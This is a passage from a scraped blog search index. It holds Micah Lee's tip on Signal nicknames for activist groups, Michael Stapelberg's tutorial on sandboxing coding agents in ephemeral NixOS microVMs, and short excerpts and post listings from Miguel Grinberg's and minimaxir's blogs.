<p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"micahflee.com/","title":"micahflee.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Is everyone in your Signal groups named something like -E- or -\ud83e\udd51-- Nicknames can help! 20260130</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"micahflee.com/Is%20everyone%20in%20your%20Signal%20groups%20named%20something%20like%20-E-%20or%20-%F0%9F%A5%91--%20Nicknames%20can%20help%21_20260130/","title":"Is everyone in your Signal groups named something like \"E\" or \"\ud83e\udd51\"? Nicknames can help!","text":"<p>\u6765\u6e90: micahflee.com \u53d1\u5e03\u65f6\u95f4: Fri, 30 Jan 2026 22:23:38 GMT \u94fe\u63a5: https://micahflee.com/are-your-signal-groups-full-of-people-name-things-like-l-or-sinicknames/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://micahflee.com/rss/', 'value': '<p>As ICE continues its invasion of American cities, kidnapping and murdering the people who live there, observers on the ground are increasingly relying on Signal groups to organize mutual aid and rapid response networks. In Minneapolis, people are using hyper-local Signal groups for their buildings, streets, neighborhoods, and schools.</p><p>If you, like me, are in a ton of newly created Signal groups full people you don't know, or just met for the first time, keeping track of who is saying what might be super confusing.</p><p>Signal has a feature called nicknames that can help. If you know that your friend Laura used to go by \"Mmm \ud83c\udf2e\" on Signal but recently changed her name to simply \"\ud83e\udd51\", you can click on the \ud83e\udd51 contact and set her nickname to \"Laura\" instead. From now on, you'll just see her as Laura, and your Signal groups will be slightly less confusing.</p><p>To set a nickname, go to a Signal group and click on the avatar of one of your contacts. It will pop up a menu like this:</p>When you tap a contact's avatar, you can click Nickname to set a nickname for them<p>Tap Nickname. You can set the name that you want to know this person as, and you can also add a note about this contact if you want. Nicknames and notes are stored end-to-end encrypted only for you. No one else can see what nicknames you've set.</p><p>From this point on, once you set \ud83e\udd51's nickname to Laura, you'll just see her as Laura. If you mention her in the chat using \"@Laura\", others in the chat will see you posting \"@\ud83e\udd51\".</p><p>That's it. Now people can use whatever crazy names they want, and change them as frequently as they want, and you no longer need to be confused.</p>"},{"location":"micahflee.com/Is%20everyone%20in%20your%20Signal%20groups%20named%20something%20like%20-E-%20or%20-%F0%9F%A5%91--%20Nicknames%20can%20help%21_20260130/#why-is-this-even-necessary-infiltrators","title":"Why is this even necessary? Infiltrators.Sign up for micahflee","text":"<p>Signal is a usable, secure, encrypted messaging app. The tech is solid. That said, there are still two ways that Signal groups get compromised:</p><ul><li>Someone's device gets searched. This typically happens after they get arrested, or searched at a border crossing or other security checkpoint, or their home or office is raided. See Practical Defenses Against Technofascism for some advise on dealing with this.</li><li>Or an infiltrator joins the group.</li></ul><p>Infiltrators join groups with lax permissions. Or, uh, maybe Trump's national security advisor just adds them.</p><p>If you're not familiar with how Signal group links and permissions work, check out Using Signal groups for activism. Some groups have group links on and anyone with the link can join. Others might allow anyone in the group to invite anyone else.</p><p>With large groups \u2013 a requirement for mass movements \u2013 group permissions like these make it easy for new people to get involved. But at the same time, they also make it a lot easier for infiltrators to snake their way in.</p><p>Because of the risk of infiltrators, it's common \u2013 and in many cases a good idea \u2013 to not put your real name in your Signal profile.</p><p>If a single infiltrator sneaks in, they'll get access to a list of everyone in the group. It's much harder for a MAGA chud to dox and harass you, or for the government to investigate you, if they only know you as \"\ud83e\udd51\", without knowing your real name.</p>\\n            \\n            \\n                \\n                \\n                    \\n                    <p>Hi, I'm Micah. I help journalists, researchers, and activists stay safe and productive.</p>\\n                    \\n        \\n            \\n            \\n                \\n                \\n                    Subscribe\\n                    \\n        \\n            \\n                \\n                \\n                \\n            \\n            \\n        \\n    \\n                \\n            \\n            \\n                Email sent! Check your inbox to complete your signup.\\n            \\n            \\n        \\n        \\n                    <p>No spam. Unsubscribe anytime.</p>\\n                \\n            \\n        '} <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"michael.stapelberg.ch/","title":"michael.stapelberg.ch","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Coding Agent VMs on NixOS with microvm.nix 20260201</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/","title":"Coding Agent VMs on NixOS with microvm.nix","text":"<p>\u6765\u6e90: michael.stapelberg.ch \u53d1\u5e03\u65f6\u95f4: 2026-02-01T09:00:00+01:00 \u94fe\u63a5: https://michael.stapelberg.ch/posts/2026-02-01-coding-agent-microvm-nix/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://michael.stapelberg.ch/feed.xml', 'value': '<p>I have come to appreciate coding\\nagents to be\\nvaluable tools for working with computer program code in any capacity, such as\\nlearning about any program\u2019s architecture, diagnosing bugs or developing proofs\\nof concept. Depending on the use-case, reviewing each command the agent wants to\\nrun can get tedious and time-consuming very quickly. To safely run a coding\\nagent without review, I wanted a Virtual Machine (VM) solution where the agent\\nhas no access to my personal files and where it\u2019s no big deal if the agent gets\\ncompromised by malware: I can just throw away the VM and start over.</p>\\n<p>Instead of setting up a stateful VM and re-installing it when needed (ugh!), I\\nprefer the model of ephemeral VMs where nothing persists on disk, except for\\nwhat is explicitly shared with the host.</p>\\n<p>The <code>microvm.nix</code> project makes it\\neasy to create such VMs on NixOS, and this article shows you how I like to set\\nup my VMs.</p>\\n"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#see-also","title":"See also","text":"\\n<p>If you haven\u2019t heard of NixOS before, check out the NixOS Wikipedia\\npage and\\nnixos.org. I spoke about why I switched to Nix in\\n2025 and have published a few blog posts about\\nNix.</p>\\n<p>For understanding the threat model of AI agents, read Simon Willison\u2019s \u201cThe\\nlethal trifecta for AI agents: private data, untrusted content, and external\\ncommunication\u201d (June\\n2025). This\\narticle\u2019s approach to working with the threat model is to remove the \u201cprivate\\ndata\u201d part from the equation.</p>\\n<p>If you want to learn about the whole field of sandboxing, check out Luis\\nCardoso\u2019s \u201cA field guide to sandboxes for AI\u201d (Jan\\n2026). I will not be\\ncomparing different solutions in this article, I will just show you one possible\\npath.</p>\\n<p>And lastly, maybe you\u2019re not in the mood to build/run sandboxing infrastructure\\nyourself. Good news: Sandboxing is a hot topic and there are many commercial\\nofferings popping up that address this need. For example, David Crawshaw and\\nJosh Bleecher Snyder (I know both from the Go community) recently launched\\nexe.dev, an agent-friendly VM hosting\\nservice. Another example is Fly.io, who launched\\nSprites.</p>\\n"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#setting-up-microvmnix","title":"Setting up microvm.nix","text":"\\n<p>Let\u2019s jump right in! The next sections walk you through how I set up my config.</p>\\n"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#step-1-network-prep","title":"Step 1: network prep","text":"\\n<p>First, I created a new <code>microbr</code> bridge which uses <code>192.168.33.1/24</code> as IP address range and NATs out of the <code>eno1</code> network interface. All <code>microvm interfaces will be added to that bridge:\\n<pre><code>systemd.network.netdevs.\"20-microbr\".netdevConfig = {\\n  Kind = \"bridge\";\\n  Name = \"microbr\";\\n};\\n\\nsystemd.network.networks.\"20-microbr\" = {\\n  matchConfig.Name = \"microbr\";\\n  addresses = [ { Address = \"192.168.83.1/24\"; } ];\\n  networkConfig = {\\n    ConfigureWithoutCarrier = true;\\n  };\\n};\\n\\nsystemd.network.networks.\"21-microvm-tap\" = {\\n  matchConfig.Name = \"microvm\";\\n  networkConfig.Bridge = \"microbr\";\\n};\\n\\nnetworking.nat = {\\n  enable = true;\\n  internalInterfaces = [ \"microbr\" ];\\n  externalInterface = \"eno1\";\\n};\\n</code></pre>"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#step-2-flakenix","title":"Step 2: <code>flake.nix</code>","text":"\\n<p>Then, I added the <code>microvm</code> module as a new input to my <code>flake.nix</code> (check out\\nthe microvm.nix documentation for\\ndetails) and enabled the <code>microvm.nixosModules.host</code> module on the NixOS\\nconfiguration for my PC (midna). I also created a new <code>microvm.nix</code> file, in\\nwhich I declare all my VMs. Here\u2019s what my <code>flake.nix</code> looks like:</p>\\n<pre><code>{\\n  inputs = {\\n    nixpkgs = {\\n      url = \"github:nixos/nixpkgs/nixos-25.11\";\\n    };\\n    # For more recent claude-code\\n    nixpkgs-unstable = {\\n      url = \"github:nixos/nixpkgs/nixos-unstable\";\\n    };\\n    stapelbergnix = {\\n      url = \"github:stapelberg/nix\";\\n      inputs.nixpkgs.follows = \"nixpkgs\";\\n    };\\n    zkjnastools = {\\n      url = \"github:stapelberg/zkj-nas-tools\";\\n      inputs.nixpkgs.follows = \"nixpkgs\";\\n    };\\n    microvm = {\\n      url = \"github:microvm-nix/microvm.nix\";\\n      inputs.nixpkgs.follows = \"nixpkgs\";\\n    };\\n    home-manager = {\\n      url = \"github:nix-community/home-manager/release-25.11\";\\n      inputs.nixpkgs.follows = \"nixpkgs\";\\n    };\\n    configfiles = {\\n      url = \"github:stapelberg/configfiles\";\\n      flake = false; # repo is not a flake\\n    };\\n  };\\n\\n  outputs =\\n    {\\n      self,\\n      stapelbergnix,\\n      zkjnastools,\\n      nixpkgs,\\n      nixpkgs-unstable,\\n      microvm,\\n      home-manager,\\n      configfiles,\\n    }@inputs:\\n    let\\n      system = \"x86_64-linux\";\\n      pkgs = import nixpkgs {\\n        inherit system;\\n        config.allowUnfree = false;\\n      };\\n      pkgs-unstable = import nixpkgs-unstable {\\n        inherit system;\\n        config.allowUnfree = true;\\n      };\\n    in\\n    {\\n      nixosConfigurations = {\\n        midna = nixpkgs.lib.nixosSystem {\\n          system = \"x86_64-linux\";\\n          specialArgs = { inherit inputs; };\\n          modules = [\\n            (import ./configuration.nix)\\n            stapelbergnix.lib.userSettings\\n            # Use systemd for network configuration\\n            stapelbergnix.lib.systemdNetwork\\n            # Use systemd-boot as bootloader\\n            stapelbergnix.lib.systemdBoot\\n            # Run prometheus node exporter in tailnet\\n            stapelbergnix.lib.prometheusNode\\n            zkjnastools.nixosModules.zkjbackup\\n            microvm.nixosModules.host\\n            ./microvm.nix\\n          ];\\n        };\\n      };\\n    };\\n}</code></pre>\\n"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#step-3-microvmnix","title":"Step 3: <code>microvm.nix</code>","text":"\\n<p>The following <code>microvm.nix</code> declares two microvms, one for Emacs (about which I wanted to learn more) and one for Go Protobuf, a code base I am familiar with and can use to understand Claude\u2019s capabilities:</p>\\n<pre><code>{\\n  config,\\n  lib,\\n  pkgs,\\n  inputs,\\n  ...\\n}:\\n\\nlet\\n  inherit (inputs)\\n    nixpkgs-unstable\\n    stapelbergnix\\n    microvm\\n    configfiles\\n    home-manager\\n    ;\\n\\n  microvmBase = import ./microvm-base.nix;\\nin\\n{\\n  microvm.vms.emacsvm = {\\n    autostart = false;\\n    config = {\\n      imports = [\\n        stapelbergnix.lib.userSettings\\n        microvm.nixosModules.microvm\\n        (microvmBase {\\n          hostName = \"emacsvm\";\\n          ipAddress = \"192.168.83.6\";\\n          tapId = \"microvm4\";\\n          mac = \"02:00:00:00:00:05\";\\n          workspace = \"/home/michael/microvm/emacs\";\\n          inherit\\n            nixpkgs-unstable\\n            configfiles\\n            home-manager\\n            stapelbergnix\\n            ;\\n        })\\n        ./microvms/emacs.nix\\n      ];\\n    };\\n  };\\n\\n  microvm.vms.goprotobufvm = {\\n    autostart = false;\\n    config = {\\n      imports = [\\n        stapelbergnix.lib.userSettings\\n        microvm.nixosModules.microvm\\n        (microvmBase {\\n          hostName = \"goprotobufvm\";\\n          ipAddress = \"192.168.83.7\";\\n          tapId = \"microvm5\";\\n          mac = \"02:00:00:00:00:06\";\\n          workspace = \"/home/michael/microvm/goprotobuf\";\\n          inherit\\n            nixpkgs-unstable\\n            configfiles\\n            home-manager\\n            stapelbergnix\\n            ;\\n          extraZshInit = \\'\\'\\n            export GOPATH=$HOME/go\\n            export PATH=$GOPATH/bin:$PATH\\n          \\'\\';\\n        })\\n        ./microvms/goprotobuf.nix\\n      ];\\n    };\\n  };\\n}\\n</code></pre>"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#step-4-microvm-basenix","title":"Step 4: <code>microvm-base.nix</code>","text":"\\n<p>The <code>microvm-base.nix</code> module takes these parameters and declares:</p>\\n<ul>\\n<li>Network settings: I like using <code>systemd-networkd(8)</code>\\n and <code>systemd-resolved(8)</code>\\n.</li>\\n<li>Shared directories for:\\n<ul>\\n<li>the workspace directory, e.g. <code>~/microvm/emacs</code></li>\\n<li>the host\u2019s Nix store, so the VM can access software from cache (often)</li>\\n<li>this VM\u2019s SSH host keys</li>\\n<li><code>~/claude-microvm</code>, which is a separate state directory, used only on the microvms.</li>\\n</ul>\\n</li>\\n<li>an 8 GB disk overlay (var.img), stored in <code>/var/lib/microvms/&lt;name&gt;</code></li>\\n<li><code>cloud-hypervisor</code> (QEMU also works well!) as the hypervisor, with 8 vCPUs and 4 GB RAM.</li>\\n<li>A workaround for systemd trying to unmount <code>/nix/store</code> (which causes a deadlock).</li>\\n</ul>\\n\\nExpand full <code>microvm-base.nix</code> code\\n<pre><code>{\\n  hostName,\\n  ipAddress,\\n  tapId,\\n  mac,\\n  workspace,\\n  nixpkgs-unstable,\\n  configfiles,\\n  home-manager,\\n  stapelbergnix,\\n  extraZshInit ? \"\",\\n}:\\n\\n{\\n  config,\\n  lib,\\n  pkgs,\\n  ...\\n}:\\n\\nlet\\n  system = pkgs.stdenv.hostPlatform.system;\\n  pkgsUnstable = import nixpkgs-unstable {\\n    inherit system;\\n    config.allowUnfree = true;\\n  };\\nin\\n{\\n  imports = [ home-manager.nixosModules.home-manager ];\\n\\n  # home-manager configuration\\n  home-manager.useGlobalPkgs = true;\\n  home-manager.useUserPackages = true;\\n  home-manager.extraSpecialArgs = { inherit configfiles stapelbergnix; };\\n  home-manager.users.michael = {\\n    imports = [ ./microvm-home.nix ];\\n    microvm.extraZshInit = extraZshInit;\\n  };\\n\\n  # Claude Code CLI (from nixpkgs-unstable, unfree)\\n  environment.systemPackages = [\\n    pkgsUnstable.claude-code\\n  ];\\n  networking.hostName = hostName;\\n\\n  system.stateVersion = \"25.11\";\\n\\n  services.openssh.enable = true;\\n\\n  # To match midna (host)\\n  users.groups.michael = {\\n    gid = 1000;\\n  };\\n  users.users.michael = {\\n    group = \"michael\";\\n  };\\n\\n  services.resolved.enable = true;\\n  networking.useDHCP = false;\\n  networking.useNetworkd = true;\\n  networking.tempAddresses = \"disabled\";\\n  systemd.network.enable = true;\\n  systemd.network.networks.\"10-e\" = {\\n    matchConfig.Name = \"e*\";\\n    addresses = [ { Address = \"${ipAddress}/24\"; } ];\\n    routes = [ { Gateway = \"192.168.83.1\"; } ];\\n  };\\n  networking.nameservers = [\\n    \"8.8.8.8\"\\n    \"1.1.1.1\"\\n  ];\\n\\n  # Disable firewall for faster boot and less hassle;\\n  # we are behind a layer of NAT anyway.\\n  networking.firewall.enable = false;\\n\\n  systemd.settings.Manager = {\\n    # fast shutdowns/reboots! https://mas.to/@zekjur/113109742103219075\\n    DefaultTimeoutStopSec = \"5s\";\\n  };\\n\\n  # Fix for microvm shutdown hang (issue #170):\\n  # Without this, systemd tries to unmount /nix/store during shutdown,\\n  # but umount lives in /nix/store, causing a deadlock.\\n  systemd.mounts = [\\n    {\\n      what = \"store\";\\n      where = \"/nix/store\";\\n      overrideStrategy = \"asDropin\";\\n      unitConfig.DefaultDependencies = false;\\n    }\\n  ];\\n\\n  # Use SSH host keys mounted from outside the VM (remain identical).\\n  services.openssh.hostKeys = [\\n    {\\n      path = \"/etc/ssh/host-keys/ssh_host_ed25519_key\";\\n      type = \"ed25519\";\\n    }\\n  ];\\n\\n  microvm = {\\n    # Enable writable nix store overlay so nix-daemon works.\\n    # This is required for home-manager activation.\\n    # Uses tmpfs by default (ephemeral), which is fine since we\\n    # don\\'t build anything in the VM.\\n    writableStoreOverlay = \"/nix/.rw-store\";\\n\\n    volumes = [\\n      {\\n        mountPoint = \"/var\";\\n        image = \"var.img\";\\n        size = 8192; # MB\\n      }\\n    ];\\n\\n    shares = [\\n      {\\n        # use proto = \"virtiofs\" for MicroVMs that are started by systemd\\n        proto = \"virtiofs\";\\n        tag = \"ro-store\";\\n        # a host\\'s /nix/store will be picked up so that no\\n        # squashfs/erofs will be built for it.\\n        source = \"/nix/store\";\\n        mountPoint = \"/nix/.ro-store\";\\n      }\\n      {\\n        proto = \"virtiofs\";\\n        tag = \"ssh-keys\";\\n        source = \"${workspace}/ssh-host-keys\";\\n        mountPoint = \"/etc/ssh/host-keys\";\\n      }\\n      {\\n        proto = \"virtiofs\";\\n        tag = \"claude-credentials\";\\n        source = \"/home/michael/claude-microvm\";\\n        mountPoint = \"/home/michael/claude-microvm\";\\n      }\\n      {\\n        proto = \"virtiofs\";\\n        tag = \"workspace\";\\n        source = workspace;\\n        mountPoint = workspace;\\n      }\\n    ];\\n\\n    interfaces = [\\n      {\\n        type = \"tap\";\\n        id = tapId;\\n        mac = mac;\\n      }\\n    ];\\n\\n    hypervisor = \"cloud-hypervisor\";\\n    vcpu = 8;\\n    mem = 4096;\\n    socket = \"control.socket\";\\n  };\\n}\\n</code></pre>\\n"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#step-5-microvm-homenix","title":"Step 5: <code>microvm-home.nix</code>","text":"\\n<p><code>microvm-base.nix</code> in turn pulls in <code>microvm-home.nix</code>, which sets up home-manager to:</p>\\n<ul>\\n<li>Set up Zsh with my configuration</li>\\n<li>Set up Emacs with my configuration</li>\\n<li>Set up Claude Code in shared directory <code>~/claude-microvm</code>.</li>\\n</ul>\\n\\nExpand full <code>microvm-home.nix</code> code\\n<pre><code>{\\n  config,\\n  pkgs,\\n  lib,\\n  configfiles,\\n  stapelbergnix,\\n  ...\\n}:\\n\\n{\\n  options.microvm = {\\n    extraZshInit = lib.mkOption {\\n      type = lib.types.lines;\\n      default = \"\";\\n      description = \"Extra lines to add to zsh initContent\";\\n    };\\n  };\\n\\n  config = {\\n    home.username = \"michael\";\\n    home.homeDirectory = \"/home/michael\";\\n\\n    programs.zsh = {\\n      enable = true;\\n      history = {\\n        size = 4000;\\n        save = 10000000;\\n        ignoreDups = true;\\n        share = false;\\n        append = true;\\n      };\\n\\n      initContent = \\'\\'\\n        ${builtins.readFile \"${configfiles}/zshrc\"}\\n        export CLAUDE_CONFIG_DIR=/home/michael/claude-microvm\\n        ${config.microvm.extraZshInit}\\n      \\'\\';\\n    };\\n\\n    programs.emacs = {\\n      enable = true;\\n      package = stapelbergnix.lib.emacsWithPackages { inherit pkgs; };\\n    };\\n\\n    home.file.\".config/emacs\" = {\\n      source = \"${configfiles}/config/emacs\";\\n    };\\n\\n    home.stateVersion = \"25.11\";\\n\\n    programs.home-manager.enable = true;\\n  };\\n}\\n</code></pre>\\n"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#step-6-goprotobufnix","title":"Step 6: <code>goprotobuf.nix</code>","text":"\\n<p>The <code>goprotobuf.nix</code> makes available a bunch of required and convenient packages:</p>\\n<pre><code># Project-specific configuration for goprotobufvm\\n{ pkgs, ... }:\\n{\\n  # Development environment for Go Protobuf\\n  environment.systemPackages = with pkgs; [\\n    # Go toolchain\\n    go\\n    gopls\\n    delve\\n    protobuf\\n    gnumake\\n    gcc\\n    git\\n    ripgrep\\n  ];\\n}\\n</code></pre>"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#running-the-vm","title":"Running the VM","text":"\\n<p>Let\u2019s create the workspace directory and create an SSH host key:</p>\\n<pre><code>mkdir -p ~/microvm/emacs/ssh-host-keys\\nssh-keygen -t ed25519 -N \"\" \\\\n  -f ~/microvm/emacs/ssh-host-keys/ssh_host_ed25519_key\\n</code></pre><p>Now we can start the VM:</p>\\n<pre><code>sudo systemctl start microvm@emacsvm\\n</code></pre><p>It boots and responds to pings within a few seconds.</p>\\n<p>Then, SSH into the VM (perhaps in a <code>tmux(1)</code>\\n session) and run Claude\\n(or your Coding Agent of choice) without permission prompts in the shared\\nworkspace directory:</p>\\n<pre><code>% ssh 192.168.83.2\\nemacsvm% cd microvm/emacs\\nemacsvm% claude --dangerously-skip-permissions\\n</code></pre><p>This is what running Claude in such a setup looks like:</p>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#creating-vms-with-claude","title":"Creating VMs with Claude","text":"\\n<p>After going through the process of setting up a MicroVM once, it becomes tedious.</p>\\n<p>I was curious if Claude Skills could\\nhelp with a task like this. Skills are markdown files that instruct Claude to do\\ncertain steps in certain situations.</p>\\n<p>I created <code>.claude/skills/create-microvm/SKILL.md</code> as follows:</p>\\n<pre><code>---\\nname: create-microvm\\ndescription: Creates a new microvm Virtual Machine on midna for running Claude in, with source code repositories and build dependencies available inside the microvm. Use when the user asks to create a new microvm.\\n---\\n\\nInspect the existing structure at ~/machines/midna (NixOS configuration using Flakes), which includes several MicroVMs in the ~/machines/midna/microvms/ directory.\\n\\nThen, create a similar structure for the microvm the user asked to create. Be sure to consider:\\n\\n1. Create a new subdirectory for this microvm, named NAME (the microvm name).\\n2. Create an entry in microvm.nix similar to an existing microvm\\'s, but:\\n3. Change hostname to NAME\\n4. Change IP address (e.g., 192.168.83.3): find used ones and chose next free\\n5. Change workspace share to /home/michael/microvm/NAME\\n6. Include build dependencies for the new microvm based on user request\\n7. Create ssh-host-keys directory\\n8. Generate SSH host keys\\n9. Clone/download source code repositories into this microvm based on user request\\n\\nOnce the microvm is defined, update ~/machines/midna to pull it in. To verify, build the config (but do not deploy).\\n\\nYou need to git-commit changes to the microvm before ~/machines/midna can see them.\\n</code></pre><p>When using this skill with Claude Code (tested version: v2.0.76 and v2.1.15), with the Opus 4.5 model, I can send a prompt like this:</p>\\n\\n<p>please set up a microvm for Debian Code Search (dcs). see ~/dcs for the source code (but clone from https://github.com/Debian/dcs)</p>\\n\\n<p>Now Claude churns for a few minutes, possibly asking a clarification question\\nbefore that. Afterwards, Claude reports back with:</p>\\n\\n<p>The dcsvm microvm has been set up successfully. Here\u2019s what was created:</p>\\n<p>Configuration:</p>\\n<ul>\\n<li>/home/michael/machines/midna/microvms/dcs.nix - Project-specific packages (Go toolchain, protobuf tools, uglify-js, yuicompressor,\\nzopfli)</li>\\n<li>Updated /home/michael/machines/midna/microvm.nix to include dcsvm with:\\n<ul>\\n<li>IP: 192.168.83.8</li>\\n<li>tapId: microvm6</li>\\n<li>mac: 02:00:00:00:00:07</li>\\n</ul>\\n</li>\\n</ul>\\n<p>Workspace:</p>\\n<ul>\\n<li>/home/michael/microvm/dcs/ - Workspace directory</li>\\n<li>/home/michael/microvm/dcs/ssh-host-keys/ - SSH host keys (ed25519)</li>\\n<li>/home/michael/microvm/dcs/dcs/ - Cloned repository from https://github.com/Debian/dcs</li>\\n</ul>\\n<p>Build verified - The configuration builds successfully.</p>\\n<p>To start the microvm after deploying:\\n<code>systemctl start microvm@dcsvm</code></p>\\n<p>To SSH into it:\\n<code>ssh michael@192.168.83.8</code></p>\\n\\n<p>Wonderful! In my experience, Claude always got the VM creation correct.</p>\\n"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#replicating-this-setup-with-claude-code","title":"Replicating this setup with Claude Code","text":"\\n<p>In fact, you can go one step further: Instead of just asking Claude to create\\nnew MicroVMs, you can also ask Claude to replicate this entire setup into your\\nNixOS configuration!</p>\\n<p>Try a prompt like this:</p>\\n\\n<p>read\\nhttps://michael.stapelberg.ch/posts/2026-02-01-coding-agent-microvm-nix/\\n\u2014 I want the exact same setup in my midna NixOS configuration please!</p>\\n\\n"},{"location":"michael.stapelberg.ch/Coding%20Agent%20VMs%20on%20NixOS%20with%20microvm.nix_20260201/#conclusion","title":"Conclusion","text":"\\n<p>NixOS has a reputation of being hard to adopt, but once you are using NixOS, you\\ncan do powerful things like spinning up ephemeral MicroVMs for a new project\\nwithin minutes.</p>\\n<p>The maintenance effort is minimal: When I update my personal PC, my MicroVM\\nconfigurations start using the new software versions, too. Customization is easy\\nif needed.</p>\\n<p>This actually mirrors my experience with Coding Agents: I don\u2019t feel like\\nthey\u2019re automatically making existing tasks more efficient, I feel that they\\nmake things possible that were previously out of reach (similar to Jevons\\nparadox).</p>\\n<p>It was fascinating (and scary!) to experience the quality increase of Coding\\nAgents during 2025. At the beginning of 2025 I thought that LLMs are an\\noverhyped toy, and felt it was almost insulting when people showed me text or\\ncode produced by these models. But almost every new frontier model release got\\nsignificantly better, and by now I have been positively surprised by Claude\\nCode\u2019s capabilities and quality many times. It has produced code that handles\\nlegitimate edge cases I would not have considered.</p>\\n<p>With this article, I showed one possible way to run Coding Agents safely (or any\\nworkload that shouldn\u2019t access your private data, really) that you can adjust in\\nmany ways for your needs.</p>'} <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"miguelgrinberg.com/","title":"miguelgrinberg.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Date Arithmetic in Bash 20260204</li> <li>How to Add a Quick Interactive Map to your Website 20260129</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"miguelgrinberg.com/Date%20Arithmetic%20in%20Bash_20260204/","title":"Date Arithmetic in Bash","text":"<p>\u6765\u6e90: miguelgrinberg.com \u53d1\u5e03\u65f6\u95f4: Wed, 04 Feb 2026 11:09:06 GMT \u94fe\u63a5: https://blog.miguelgrinberg.com/post/date-arithmetic-in-bash</p> <p>Date and time management libraries in many programming languages are famously bad. Python's datetime module comes to mind as one of the best (worst?) examples, and so does JavaScript's Date class. It feels like these libraries could not have been made worse on purpose, or so I thought until today, when I needed to implement some date calculations in a backup rotation script written in bash.</p> <p>So, if you wanted to learn how to perform date and time arithmetic in your bash scripts, you've come to the right place. Just don't blame me for the nightmares.</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"miguelgrinberg.com/How%20to%20Add%20a%20Quick%20Interactive%20Map%20to%20your%20Website_20260129/","title":"How to Add a Quick Interactive Map to your Website","text":"<p>\u6765\u6e90: miguelgrinberg.com \u53d1\u5e03\u65f6\u95f4: Thu, 29 Jan 2026 12:25:14 GMT \u94fe\u63a5: https://blog.miguelgrinberg.com/post/how-to-add-a-quick-interactive-map-to-your-website</p> <p>In this article I want to share a technique that I recently learned to display an interactive map on a website. For this, you will need just a few lines of HTML and JavaScript. This solution does not require you to sign up for any accounts or services anywhere, it is completely free and open source, and can be integrated with any front or back end web framework.</p> <p>Give the demo below a try and if you like it, then keep on reading to learn how you can add a map like this one to your website in just 3 quick steps!</p> <p></p> <p>\u00a9\u00a9</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"minimaxir.com/","title":"minimaxir.com","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"minimaxir.com/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"minimaxir.com/#1-nano-banana-pro-is-the-best-ai-image-generator-with-caveats","title":"1. Nano Banana Pro is the best AI image generator, with caveats","text":"<p>\u94fe\u63a5: https://minimaxir.com/2025/12/nano-banana-pro/</p> <p>\u65e5\u671f: Mon, 22 Dec 2025 10:45:00 -0800</p> <p>\u6458\u8981: The problem with Nano Banana Pro is that it\u2019s too good.</p>"},{"location":"minimaxir.com/#2-nano-banana-can-be-prompt-engineered-for-extremely-nuanced-ai-image-generation","title":"2. Nano Banana can be prompt engineered for extremely nuanced AI image generation","text":"<p>\u94fe\u63a5: https://minimaxir.com/2025/11/nano-banana-prompts/</p> <p>\u65e5\u671f: Thu, 13 Nov 2025 09:30:00 -0800</p> <p>\u6458\u8981: Nano Banana allows 32,768 input tokens and I\u2019m going to try to use them all dammit.</p>"},{"location":"minimaxir.com/#3-claude-haiku-45-does-not-appreciate-my-attempts-to-jailbreak-it","title":"3. Claude Haiku 4.5 does not appreciate my attempts to jailbreak it","text":"<p>\u94fe\u63a5: https://minimaxir.com/2025/10/claude-haiku-jailbreak/</p> <p>\u65e5\u671f: Fri, 17 Oct 2025 09:15:00 -0700</p> <p>\u6458\u8981: \u201cIs any of that genuinely useful to you? Or were you mainly checking whether that jailbreak attempt would work?\u201d</p>"},{"location":"minimaxir.com/#4-can-modern-llms-actually-count-the-number-of-bs-in-blueberry","title":"4. Can modern LLMs actually count the number of b's in \"blueberry\"?","text":"<p>\u94fe\u63a5: https://minimaxir.com/2025/08/llm-blueberry/</p> <p>\u65e5\u671f: Tue, 12 Aug 2025 09:00:00 